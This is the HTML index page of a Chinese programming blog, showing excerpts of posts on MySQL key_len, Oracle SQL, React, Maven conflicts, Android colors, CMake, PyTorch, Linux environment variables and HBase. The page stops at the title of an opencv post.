<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b64cd26c77382420f9362ee33680953/" rel="bookmark">
			MySQL Explain执行计划key_len详解(特意针对date和datetime详细测试说明)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL Explain执行计划key_len详解(特意针对date和datetime详细测试说明) 我们在使用Explain查看SQL执行计划时，其中有一列为key_ken
key_len表示使用的索引长度，那么key_len的长度是如何计算的？ 对于复合索引，通过key_len可以看出sql使用了复合索引的哪几个字段。
常见的列类型长度计算：
列类型是否为空长度key_len备注tinyint允许Null1key_len = 1+1允许NULL，key_len长度加1tinyint不允许Null1key_len = 1不允许NULLint允许Null4key_len = 4+1允许NULL，key_len长度加1int not null不允许Null4key_len = 4不允许NULLbigint允许Null8key_len = 8+1允许NULL，key_len长度加1bigint not null不允许Null8key_len = 8不允许NULLchar(1)允许Nullutf8mb4=4,utf8=3,gbk=2key_len = 1*3 + 1允许NULL，字符集utf8，key_len长度加1char(1) not null不允许Nullutf8mb4=4,utf8=3,gbk=2key_len = 1*3不允许NULL，字符集utf8varchar(10)允许Nullutf8mb4=4,utf8=3,gbk=2key_len = 10*3 + 2 + 1动态列类型，key_len长度加2，允许NULL，key_len长度加1varchar(10) not null不允许Nullutf8mb4=4,utf8=3,gbk=2key_len = 10*3+ 2动态列类型，key_len长度加2 其他:
所有的索引字段，如果设置允许null，key_len则需要加1。char和varchar型的字段长度，char和varchar是日常使用最多的字符类型。char（N）用于保存固定长度的字符串，长度最大为255，比指定长度大的值将被截短，而比指定长度小的值将会用空格进行填补。 varchar（N）用于保存可以变长的字符串，长度最大为65535，只存储字符串实际实际需要的长度（它会增加一个额外字节来存储字符串本身的长度），varchar使用额外的1~2字节来存储值的的长度，如果列的最大长度小于或者等于255，则用1字节，否则用2字节。char和varchar跟字符编码也有密切的联系，latin1占用1个字节，gbk占用2个字节，utf8占用3个字节，utf8mb4占用4个。（不同字符编码占用的存储空间不同） 索引长度 char()和varchar()索引长度的计算公式：key_len=基础长度 * 列长度 + 1(如果是允许null) + 2(如果是变长列) (Character Set基础长度：utf8mb4=4,utf8=3,gbk=2,latin1=1)浮点型: float key_len=4 ; double key_len=8 日期&amp;时间类型的字段长度（根据版本有变化，单独说明）
DataType orage RequiredBefore MySQL 5.6.4 (版本低于5.6.4 )Required as of MySQL 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b64cd26c77382420f9362ee33680953/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17ab9966bebd74526c55d275fde1398c/" rel="bookmark">
			Oracle 一行拆分为多行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、背景
二、预期结果
三、实现sql
四、sql分析
一、背景 拼接字符串根据某种规律拆分并转化为多行，只要拆分的主键和数据即可
二、预期结果 1、表A
2、去除无效的字符，如'['、']'等
3、按逗号分割后结果
三、实现sql 1、去除无效的字符，如'['、']'等
SELECT ID, replace(replace(replace(test /*替换的列*/, '[', ''), ']', ''), ' ', '') FROM table /*替换的表*/ 2、按逗号分割后结果
法一：
SELECT distinct ID, REGEXP_SUBSTR(test1 /*替换拆分的列*/, '[^,]+', 1, LEVEL, 'i') as test2 FROM table /*替换表*/ CONNECT BY LEVEL &lt;= LENGTH(test1 /*替换拆分的列*/) - LENGTH(REPLACE(test1 /*替换拆分的列*/, ',', '')) + 1 order by ID 法二：
SELECT distinct ID, REGEXP_SUBSTR(test1 /*替换拆分的列*/, '[^,]+', 1, LEVEL, 'i') as test2 FROM table /*替换表*/ CONNECT BY LEVEL &lt;= (regexp_count(test1 /*替换拆分的列*/, ',') + 1) order by ID 法三：数据量大时优先选用，效率高
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17ab9966bebd74526c55d275fde1398c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8c36781cbf46a3e9cf197cdf16486ff/" rel="bookmark">
			VMware虚拟机打开后黑屏处理方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		虚拟机黑屏怎么办 vmware虚拟机开机黑屏的解决方法
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20ef7a132816ac3403a539bdcc81403f/" rel="bookmark">
			【React的特性&amp;事件&amp;表单的使用&amp;函数组件】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、React的特性二、React的事件三、表单的使用四、函数组件 一、React的特性 1、ref：使用createRef创建ref,把该ref和节点进行绑定
2、key：列表在输出元素时，每个列表项需要有key属性。主要作用在构建虚拟的DOM时，进行新旧的区分
3、children：用于传递组件内部要渲染的内容。通过props.children接收父组件传过来的要渲染的内容
4、dangerouslySetInnerHTML：在React元素中直接添加InnerHTML
二、React的事件 1、react使用的是合成事件而非原生的DOM事件。在react中给元素添加事件类似于行间事件
(1)行间事件：事件名称纯小写,事件接收的是字符串
&lt;button οnclick=“事件处理函数名”&gt;提交&lt;/button&gt;
(2)React类似于行间事件：事件名称采用驼峰命名法,可以通过JSX插值表达式放入函数
&lt;button onClick={ this.clickHandler }&gt;点击&lt;/button&gt;
2、在React中添加事件时要注意的问题
(1)事件处理函数是没有绑定this：即在事件处理函数中this为undefined
(2)若在事件处理函数中要使用this，可以将该事件处理函数变成箭头函数，或者通过bind函数绑定this
(3)获取事件源：
clickHandler=(e)=&gt;{
console.log(e.target) //输出事件源
}
(4)在React中阻止默认事件不能使用return false，必须使用event.preventDefault()
e.preventDefault()
三、表单的使用 1、将组件的状态(state)与表单的状态进行绑定：当组件的state发生改变时修改表单的状态,或者表单的状态被改变时通过setState修改组件的状态,这样就形成了组件对表单控件的控制—受控组件
(1)输入类型的表单控件,控制的是value属性
(2)单选框和复选框控制的是checked属性
2、受控组件：实现组件的状态和表单控件状态的同步(间接实现了双向绑定)
3、非受控组件：组件的状态和表单控件状态不同步(只是表单控件的初值和组件的state一致)。无需添加onChange事件,对于输入型表单控件使用defaultValue，对于复选框和单选框使用defaultChecked.
四、函数组件 函数组件 ：一个函数就是一个组件(简易组件)。函数的第一个参数是父级组件传过来的props,返回值是该组件 要输出的视图。
1、在react16.7之前函数组件中不能定义state，也没有生命周期。一般作为纯展示组件使用。又称为无状态组件
2、类组件的缺点：
(1)关于this的绑定问题
(2)很多业务逻辑写在生命周期函数componentDidMount，这样是组件变得复杂并难以维护
3、React Hooks：React16.8开始使用。本质是一个特殊的函数，提供很多个内置的Hook,来帮助开发者实现很多只能在类组件中使用的功能。
(1)useState：通过该Hook，开发者可以在函数组件中使用state.
语法：const [state,setState] = useState(initialState)
该方法的第一个参数’initialState’：是state的初始值，该方法返回的是一个数组
该数组的第一个元素(索引为0的元素)是state的具体值,该数组的第二个元素(索引为0的元素)是一个方法,用来更新state值,然后引起视图的更新
注意的问题：
a、useState的返回setState方法是同类组件的setState,是一个异步方法，需要组件更新后state的值才能变成新值
b、useState返回的setState方法不能像类组件中的setState方法来更改多个属性的值
c、在函数组件中可以使用useState创建多个state
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d5fef8d6762df0ffbabe6cc27717903/" rel="bookmark">
			为什么电脑一用wps就卡住了？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小编最近打开WPS，电脑就出现卡顿的情况，这是怎么回事？是系统问题还是软件出现了问题，经过检查不是电脑问题，那下面就和小编一起来看看电脑一用wps就卡住了的解决办法。
操作方法：
1、按住键盘上面的Ctrl+Alt+esc组合键，打开任务管理器；
2、选择卡死的wps软件，然后选择结束任务；
3、然后重新打开wps软件即可。
另外，还有其他的原因可能导致软件卡住，具体内容如下：
1、CPU负荷过大，或者工作不正常。检查CPU和显卡散热，除尘，上油，或更换风扇。
2、电源电压不稳，电源功率不足。更换质量高的功率大的电源。
3、经常清理磁盘和整理磁盘碎片。
4、关闭一些启动程序。
5、删除不用的程序软件。
6、软件和系统不兼容，建议升级到需要的系统。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27ce6853529aaadaa713c9ba84238a7c/" rel="bookmark">
			新建springboot项目，maven与idea版本冲突。method ‘void ＜init＞()‘ not found。最新解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一开始遇到这个问题，在网上查相关 资料，使用了各种 解决方法，都没有效果，被困扰了差不多两天才解决掉，气死！！！！
项目场景： idea新建springboot项目
这里先展现一下创建过程： 文件-新建-项目，jdk选择1.8 新建的项目结构
新建出来的项目中，可以发现Demo2Application.java文件有问题。
解决方法参见java文件左下角出现橙色小J，无法识别为maven项目 然后本次的问题就要出现了 ！！！
问题描述 解决好这个小J的问题后，项目变成如下情况：
可以看到，Demo2Application.java文件下面出现红线。并且build出现报错
java.lang.RuntimeException: java.lang.RuntimeException: org.codehaus.plexus.component.repository.exception.ComponentLookupException: com.google.inject.ProvisionException: Unable to provision, see the following errors: 1) Error injecting constructor, java.lang.NoSuchMethodError: org.apache.maven.model.validation.DefaultModelValidator: method 'void &lt;init&gt;()' not found at org.jetbrains.idea.maven.server.embedder.CustomModelValidator.&lt;init&gt;(Unknown Source) while locating org.jetbrains.idea.maven.server.embedder.CustomModelValidator at ClassRealm[maven.ext, parent: ClassRealm[plexus.core, parent: null]] (via modules: org.eclipse.sisu.wire.WireModule -&gt; org.eclipse.sisu.plexus.PlexusBindingModule) while locating org.apache.maven.model.validation.ModelValidator annotated with @com.google.inject.name.Named(value="ide") 原因分析： 在网上查了很多原因，最后总结为如下：maven 版本与idea版本发生冲突 造成的。
解决方案： 经查看，idea版本味2020.2，maven版本是3.8.6
经过查询，2020版的idea最好适配maven的版本是3.6.3。而我本机已经安装过这个版本，直接更改一下 。
如果不会安装maven的小伙伴，可以参考mac安装配置maven，并配置到idea
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27ce6853529aaadaa713c9ba84238a7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0f7a494202267f8997eea8f0566d5dd/" rel="bookmark">
			Android 设置背景颜色透明度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 本章是对设计给出的颜色做透明度的处理
原因 一般情况下我们是不需要做处理的，那为什么又需要我们做透明度呢，原因就是咱们的设计小哥哥、小姐姐们没有自己做处理，如果处理了的话，我们直接使用设计标注的AHEX颜色就行，但是也有可能是设计软件上传后的BUG导致颜色透明度没处理，此时就需要我们根据对应标注的透明度自己换算。
上图就是一简单的案例，我问了设计小姐姐为什么上面标注了透明度为啥下面的颜色没有对应的改变，设计小姐姐给我的回复是做处理了但是不知道上传后就成这样了，因此为了省时间我就自己处理了。
实践 设置背景透明度有两种方法： 方法一：代码设置
// LinearLayout背景设置透明度75% dingRelPhoneOneLogin.getBackground().setAlpha(191);// 透明度设为75% 这个参数范围为0-255，透明度 = 255*比例
控件必须先设置背景颜色或者drawable，否则会报错。
这种方法合适设置整个控件的透明度
方法二：修改颜色，直接在XML中设置
Android颜色十六进制，RGB模式为6位，加上2位透明度就是8位。6位颜色默认透明度为FF（不透明）。
下面以75% 透明度为例子说明：
75%转换成10进制 75%*255=191.25(四舍五入191)191转化为16进制 191----BF 此时我们得到了75%的透明度十六进制，为BF，和刚才需求给我们的背景颜色组合，组成8位的十六进制代码为#BFFFFFFF。
下面是一个透明度和十六进制转换表： 100% — FF 99% —- FC 98% —- FA 97% —- F7 96% —- F5 95% —- F2 94% —- F0 93% —- ED 92% —- EB 91% —- E8 90% —- E6 89% —- E3 88% —- E0 87% —- DE 86% —- DB 85% —- D9 84% —- D6 83% —- D4 82% —- D1 81% —- CF 80% —- CC 79% —- C9 78% —- C7 77% —- C4 76% —- C2 75% —- BF 74% —- BD 73% —- BA 72% —- B8 71% —- B5 70% —- B3 69% —- B0 68% —- AD 67% —- AB 66% —- A8 65% —- A6 64% —- A3 63% —- A1 62% —- 9E 61% —- 9C 60% —- 99 59% —- 96 58% —- 94 57% —- 91 56% —- 8F 55% —- 8C 54% —- 8A 53% —- 87 52% —- 85 51% —- 82 50% —- 80 49% —- 7D 48% —- 7A 47% —- 78 46% —- 75 45% —- 73 44% —- 70 43% —- 6E 42% —- 6B 41% —- 69 40% —- 66 39% —- 63 38% —- 61 37% —- 5E 36% —- 5C 35% —- 59 34% —- 57 33% —- 54 32% —- 52 31% —- 4F 30% —- 4D 29% —- 4A 28% —- 47 27% —- 45 26% —- 42 25% —- 40 24% —- 3D 23% —- 3B 22% —- 38 21% —- 36 20% —- 33 19% —- 30 18% —- 2E 17% —- 2B 16% —- 29 15% —- 26 14% —- 24 13% —- 21 12% —- 1F 11% —- 1C 10% —- 1A 9% —- 17 8% —- 14 7% —- 12 6% —- 0F 5% —- 0D 4% —- 0A 3% —- 08 2% —- 05 1% —- 03 0% —- 00 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b10fc3ad3efd09f4fcb69b9b22969a2e/" rel="bookmark">
			CmakeList文件常见命令含义和用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cmake_minimum_required 指定cmake最小版本 #命令可选，如果 CMakeLists.txt 文件中使用了高版本cmake命令，需要加上这样一行，提醒用户升级到该版本之后再执行cmake，以防版本不满足导致编译失败。 cmake_minimum_required(VERSION 2.6) project 设置项目名称 #命令可选，它会引入两个变量 yolov5_BINARY_DIR和yolov5_SOURCE_DIR， #同时，cmake 自动定义了两个等价的变量 PROJECT_BINARY_DIR 和 PROJECT_SOURCE_DIR。 PROJECT_BINARY_DIR = 全路径/build，PROJECT_SOURCE_DIR = 全路径/src project(yolov5) add_definitions 添加编译器命令行标志
1)通常的情况下我们使用其来添加预处理器定义 add_definitions(-std=c++11) add_definitions(-Og -pthread) 2)结合option使用，控制代码编译开关的开启和关闭。
首先cpp代码为
#ifdef BOOSTON #include &lt;boost/thread.hpp&gt; #include "boost/thread/mutex.hpp" #endif 对应的cmakelist.txt为
option(USEBOOST "run with boost" OFF) IF(USEBOOST) add_definitions(-DBOOSTON) ENDIF(USEBOOST) 编译的时候可以设置USEBOOST开启或者关闭
cmake -DBOOSTON=1 .. cmake -DBOOSTON=0 .. set / list 设置别名（赋值） set(CMAKE_CXX_STANDARD 11) set(CMAKE_BUILD_TYPE Debug) set(SRC_LIST yolo.cpp) add_executable(yolo ${SRC_LIST}) message 打印信息
message(${SOURCE_DIR})
message(“the system is ubuntu”)include_directories 添加第三方库包含的目录（即找头文件） include_directories(/usr/local/cuda/include) #路径多的时候也可以写成 include_directories( ${PROJECT_SOURCE_DIR}/ina ${PROJECT_SOURCE_DIR}/inb ${PROJECT_SOURCE_DIR}/inc ) link_directories 添加需要链接的库文件目录（即找 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b10fc3ad3efd09f4fcb69b9b22969a2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/709b893eec9f9b13001344315baad332/" rel="bookmark">
			对象 属性复制工具类, 支持 List、Set、MyBatisPlus Page复制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import org.springframework.beans.BeanUtils; import java.util.List; import java.util.Set; import java.util.stream.Collectors; /** * 描述：对象 属性复制 * 背景：基于 springframework BeanUtils 封装 * 适用：支持不同类间 Object、List、Set、MyBatisPlus Page 同类型同名属性复制 * * @author czy * @date 2022/02/26 22:24 **/ public class BeanUtil { /** * 对象 属性复制 * * @param source the source bean * @param clazz class to instantiate * @param &lt;T&gt; * @return */ public static &lt;T&gt; T copyProperties(Object source, Class&lt;T&gt; clazz) { if (source == null) { return null; } T result = null; try { result = clazz.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/709b893eec9f9b13001344315baad332/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbdb6f7bd23065c2dd36c1f9cdb10c45/" rel="bookmark">
			expect DOT, actual DOT pos 27, line 2, column 13, token DOT；SQL state [null]；
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： 新增数据的一个接口，页面请求数据，保存数据在其他系统，还有请求日志保存操作。
数据库：sqlserver、mysql
问题描述 此bug刚开发现是偶发性，请求就报错，重启后这种情况就不存在了，等一段时间，又会出现。
后续通过测试稳定复现后发现，有一个参数（主键），同一个主键的情况下，第一次请求会报错，第二次请求就是不会报错。
看到sql报错后就一直围绕sqlserver sql 语法上进行排查问题，请教了大佬，也尝试了很多方法优化sql，排除关键字，都是无效。
报错sql： sql看起来也没什么问题
SELECT top (1) tbdsl.FNAME AS fname , t_bd_operatorentry.FNUMBER AS fnumber FROM T_BD_STAFF tbds LEFT JOIN T_BD_STAFF_L tbdsl ON tbds.FSTAFFID = tbdsl.FSTAFFID LEFT JOIN T_BD_OPERATORENTRY t_bd_operatorentry ON t_bd_operatorentry.FSTAFFID = tbds.FSTAFFID WHERE tbds.FNUMBER = #{staffId} 问题代码：这段代码看起来没什么错，转换保存数据用的
@Override public void add(String bizType, String params, String result, String errorMessage) { this.save(crmToErpSysLog); } @Async("taskLogExecutor") @Override public void saveResult(String bizType, String param, String result) { add(bizType, JSONObject.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbdb6f7bd23065c2dd36c1f9cdb10c45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/988e2993f598d670b7fdab2bb0ae117a/" rel="bookmark">
			pytorch神经网络实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们从PyTorch中经典的quickstart示例开始，从中学习神经网络构建和训练过程。
其中要学到并熟练掌握的是如下这些流程：
数据预处理构建模型定制模型损失函数和优化器训练并观察超参数 下面我们就一步步分解这个过程，其中也会学习认识到一些pytorch为我们提供的框架内置对象和函数。初次接触可能还不是很适应，所以以先完成完整的模型训练流程为重。后续再根据任务需求，一步步的扩展pytorch的认知版图
数据预处理 模型训练用的样本，大部分都来自于外部文件系统。本次训练用的数据来自框架内置的数据集，所以代码没有泛化性。涉及到具体数据再做补充。
PyTorch 有两个用于处理数据的工具：torch.utils.data.DataLoader 和 torch.utils.data.Dataset。 Dataset 存储的是数据样本和对应的标签，DataLoader 把Dataset包装成一个可迭代的对象。
import torch from torch import nn from torch.utils.data import DataLoader from torchvision import datasets from torchvision.transforms import ToTensor, Lambda, Compose import matplotlib.pyplot as plt 本次的数据样本来自于Pytorch的TorchVision 数据集。
# 下载的数据集文件会保存到当前用户工作目录的data子目录中。 # 如果不想下载后就找不到了，建议修改root参数的值。 # 例如"D:\\\\datasets\\\\fashionMNIST\\\\"一类的绝对路径 training_data = datasets.FashionMNIST( root="data", train=True, download=True, transform=ToTensor(), ) # 测试集也需要下载，代码和上面一样。但参数train=False代表不是训练集(逻辑取反,就是测试集) test_data = datasets.FashionMNIST( root="data", train=False, download=True, transform=ToTensor(), ) 下一步就是对已加载数据集的封装，把Dataset 作为参数传递给 DataLoader。这样，就在我们的数据集上包装了一个迭代器(iterator)，这个迭代器还支持自动批处理、采样、打乱顺序和多进程数据加载等这些强大的功能。这里我们定义了模型训练期间，每个批次的数据样本量大小为64，即数据加载器在迭代中，每次返回一批 64 个数据特征和标签。
batch_size = 64 # 创建数据加载器 train_dataloader = DataLoader(training_data, batch_size=batch_size, shuffle=True) test_dataloader = DataLoader(test_data, batch_size=batch_size) # 测试数据加载器输出 for X, y in test_dataloader: print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/988e2993f598d670b7fdab2bb0ae117a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/623ece0fc6e22ec9223eb94bd6d3dcd4/" rel="bookmark">
			操作系统——环境变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.环境变量的基本概念1.1 解密如何输入程序名，即可执行程序1.2 环境变量的基本内容1.3 查看所有的环境变量 2.环境变量的组织方式2.1 本地变量导入环境变量2.2 程序如何实现带选项的功能2.3 用代码获得环境变量 3.环境变量具有全局性的理解 前言：在Linux下，我们在命令行上执行一个可执行文件，一般用的是 ./+文件名。但是运行指令或命令前面却不需要加上 ./。指令和命令本质上也是可执行文件，为什么它们之前不用加 ./呢？还有一点，命令或者指令后面加上选项可以实现不同的功能，这又是怎么实现的？ 1.环境变量的基本概念 环境变量(environment variables)一般是指在操作系统中用来指定操作系统运行环境的一些参数如：我们在编写C/C++代码的时候，在链接的时候，从来不知道我们的所链接的动态静态库在哪里，但
是照样可以链接成功，生成可执行程序，原因就是有相关环境变量帮助编译器进行查找。环境变量通常具有某些特殊用途，还有在系统当中通常具有全局特性 1.1 解密如何输入程序名，即可执行程序 ./是为了帮助系统对应的程序在哪里，也不一定是./，绝对路径和相对路径都可以。
比如：打印hollow world。
1 #include&lt;stdio.h&gt; 2 int main() 3 { 4 printf("hollow world\n"); 5 return 0; 6 } 7 路径为/root/ly ,程序名为qq。
使用绝对路径找到可执行程序：
/root/ly/qq 使用相对路径找到可执行程序：
./qq 运行结果：
那么执行一个可执行文件，必须要找到它的路径(位置)，那么指令，命令它们的路径是如何找到的呢？
环境变量，输入一个指令后，系统会自动查找环境变量中的PATH，它存的就是所有指令的路径，按个遍历PATH的存的路径，找到了那么指令运行成功，找不到那么会报命令找不到。
验证：
(1)查看环境变量PATH
(2)查看指令的路径是否在PATH中存着
用which指令查看指令的路径：
which 指令 ls和clear都在 /usr/bin 路径下，观察上面的PATH，不难发现确实有这个路径。
(3)自己配置环境变量PATH。
如果想要自己的程序和指令一样，不输入路径就能执行，很简单。只需要将程序的路径添加到PATH里就可以了。我这里强烈不推荐将路径拷贝到 /usr/bin或者其他的指令路径下，虽然拷贝进去确实能和指令一样实现，但是会污染指令池，以后的某一天，可能输入一个指令，莫名其妙的打印了一句hollow world。毫无疑问，是指令池放了不该放的东西。所以我的做法是，将程序路径加入到PATH里。 运行以下指令：
export PATH=$PATH:程序路径 上面的程序路径是/root/ly,我们来将其添加到PATH中。
已经将程序路径添加进PATH，现在我们来执行qq程序，发现就像指令一样，直接输入程序名即可。
1.2 环境变量的基本内容 PATH : 指定命令的搜索路径 HOME : 指定用户的主工作目录(即用户登陆到Linux系统中时,默认的目录) SHELL : 当前Shell,它的值通常是/bin/bash。 环境变量的内容很多，上文只讲了PATH，常见的还有HOME和SHELL。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/623ece0fc6e22ec9223eb94bd6d3dcd4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ada970eec649728ea6ee1636ca96d89/" rel="bookmark">
			这是一个关于9月份正式开始跨考408的随笔
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 个人本科为工科光电信息非科班，考研跨考本校专硕计算机技术。
七八月份个人原因+实习导致准备的断断续续，现在打算静下心来开始备考。
本人基础：目前大四刚开学，学习过数电与单片机，四级596，ccf-csp认证：300/500目前进度：数学一基础一轮（1800基础已做完、660现代部分已做完，但高数基本忘光了）、408专业课（已基本完成王道数据结构和计算机组成原理一轮）、考研英语一已完成单词三轮(浅做了两套卷子)、政治未开始. 九月份计划： 408专业课：完成《操作系统》和《计算机网络》的学习，并且将4本王道辅导书仔细过一轮（尤其是课后大题）数学一：完成《660》并进入强化阶段（重点为高数）政治：参加九月《肖1000》带背营英语一：完成+校对历年（2000-2022）英一真题阅读+完型 为什么写这个博客？ 1、有信心上岸并记录考研历程；2、对部分知识点进行复习总结；3、监督自己进度； 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8a9a04101b0c64d198e957d54b085fd/" rel="bookmark">
			计算机存储器——内存、外存详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一）内存与外存的含义 内存指的就是主板上的存储部件，CPU直接与之沟通，并用其存储数据的部件，存放当前正在使用的（即执行中的）数据和程序，它的物理实质就是一组或多组具备数据输入输出和数据存储功能的集成电路，内存只用于暂时存放程序和数据，一旦关闭电源或发生断电，其中的程序和数据就会丢失。
外存包括软盘、硬盘和光盘，存放在其中的数据靠磁来维持，因此可永久保存数据。
二）内存与外存的特点 特点： 内存处理速度快、存储容量小、断电后信息丢失；外存处理速度慢、存储容量大、信息永久保存。
三）内存与外存的区别
区别：
易失性不同：内存，例如随机存取内存（RAM），是具有易失性的。这意味着当系统断电时，数据就会丢失。与之相反，外部存储是非易失性的，因此即使没有电源，它也能保存数据。性能不同：在大多数情况下，外存比内存的速度慢得多。而与外存不同的是，RAM直接通过更宽更快的总线连接到CPU。存储时长不同：内存断电后不保留，外存能长期保留。访问权限不同：CPU只能直接访问内存，外存的东西要先到内存CPU才能处理。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9ed722dc580368ef250e0bded2ece44/" rel="bookmark">
			Hbase-3-4-Hbase读写数据流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写流程：
1：Client先访问zookeeper，得到对应的RegionServer地址
2：Client对RegionServer发起写请求，RegionServer接受数据写入内存
3：当MemStore的大小达到一定的值后，flush到StoreFile并存储到HDFS
Region是hbase存储数据的基本单元，数据都存储在Region中，每一个Region只存储一个columnFamily（列族）的数据，而且只是这个列族的一部分，当Region的大小达到某个阈值之后，会根据rowkey的排序，划分为多个Region，每个Region中包含多个Store对象，每个Store对象包含一个memStore和一个或多个Store File,memStore是数据在内存的实体，并且一般是有序的，当有数据写入的时候，回先写入到memStore中，当memStore的大小达到上限之后，Store会创建StoreFile，StoreFile便是Hfile的一层封装。
Hbase保证内存中的数据不会丢失，是使用HLog，HLog是WAL（预写日志）的一种实现，RegionServer将更新操作记录到memStore，然后更新到HLog中，只有当更新到HLog中成功后，这条记录才算真正成功的写入，当memStore数据丢失，可以使用HLog找回，注意，一般的WAL是先写入日志再写入内存，但是Hbase是先写入内存后写入日志
4-Hbase读数据流程
1：client先访问zookeeper，得到对应的RegionServer地址
访问zookeeper中的meta得到RegionServer的节点信息，将 hbase的meta表缓存到本地，再根据meta表获取要访问的表所 对应的RegionServer的信息，
2：Client对RegionServer发起读请求
3：当RegionServer收到Client的读请求后，先扫描自己的MemStore，在扫描BlockCache（加速读内容缓存区），如果还没有找到则StoreFile中读数据，然后将数据返回给Client
注意：client读写数据并没有访问Hmaster，只需要访问zookeeper就可以了，原因在于：Hmaster启动的时候会把meta的信息表加载到zookeeper中，meta表记录了hbase所有的表所有的region的详细信息，例如region开始的key，结束的key，所在regionServer的地址，habse的meta表就相当于一个目录，通过meta表可以快速定位数据的实际位置，座椅读写操作只需要与zookeeper和对应的RegionServer进行交互就可以了，Hmaster只负责维护table和region的元数据信息，协调各个regionServer，这样Hmaster的负载就小了很多
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3886017f3b629902c2477749efe550d7/" rel="bookmark">
			关于elementUI中Cascader 级联选择器高度超过屏幕的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在elementUI中直接使用Cascader 级联选择器效果跟组件库不一样，数据过多导致菜单选择部分超出了页面，前面的数据没办法看到从而导致了没办法选择。从网上找到了以下解决办法，发布此篇文章只是为了方便自己翻阅。
解决方法：
在公共初始化的css样式文件中添加以下代码即可解决。
.el-cascader-panel { height: 300px; } 解决后的效果如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f34ccd3513d197a85dc907e6e9593748/" rel="bookmark">
			opencv图像滤波
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
